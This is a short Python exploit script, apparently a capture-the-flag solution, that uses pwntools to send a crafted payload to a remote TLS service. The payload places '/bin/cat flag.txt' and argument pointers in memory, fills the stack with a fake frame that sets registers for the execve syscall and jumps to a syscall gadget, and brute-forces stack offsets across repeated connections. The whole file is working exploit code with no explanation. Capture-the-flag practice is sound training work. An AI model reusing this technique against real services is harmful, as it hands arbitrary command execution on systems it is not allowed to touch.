# run as
# python solve-xenia.py ; ./stdmap < /tmp/solve.dat
#
# assumes rsp = ...358 at entry to main, adjust line 48 accordingly

import struct
import pwn

ADDR = "hem.60.nu"
PORT = 50000

addr_data = 0x404000
data = b'/bin/cat\x00'

addr_argv1 = addr_data + len(data)
data += b'flag.txt\x00'

addr_ind_addr = addr_data + len(data)
data += struct.pack("Q", 0x004011ab)

addr_argv_ptr = addr_data + len(data)
data += struct.pack("QQQ", addr_data, addr_argv1, 0)

addr_env_ptr = addr_data + len(data)
data += struct.pack("Q", 0)

# before syscall:
# rdi = 0x404000
# rsi = [rsp+0x10]
# rdx = [rsp+0x20]
# rax = [rsp+0x18]

stack_override = (
    struct.pack("Q", 0) + # rsp
    struct.pack("Q", 0) + # rsp + 0x8
    struct.pack("Q", addr_argv_ptr) + # rsp + 0x10 -> rsi
    struct.pack("Q", 59) + # rsp + 0x18 -> rax
    struct.pack("Q", addr_env_ptr) + # rsp + 0x20 -> rdx
    struct.pack("Q", 0) +
    struct.pack("Q", 0) +
    struct.pack("Q", 0x00401174) # before syscall
)

responses = set()
for rsp_offset in range(0, len(stack_override), 8):
    for i in range(5):
        print(f"+{hex(rsp_offset)}, attempt {i}")

        payload = data.ljust(0x100 + rsp_offset)
        while len(payload) < 0x1000:
            payload += stack_override

        p = pwn.remote(ADDR, PORT, ssl=True)
        p.send(str(len(payload)).encode() + b'\n')
        p.recv()
        p.send(payload)
        got = p.recv(timeout=1)
        responses.add(got)

        p.close()

print(responses)
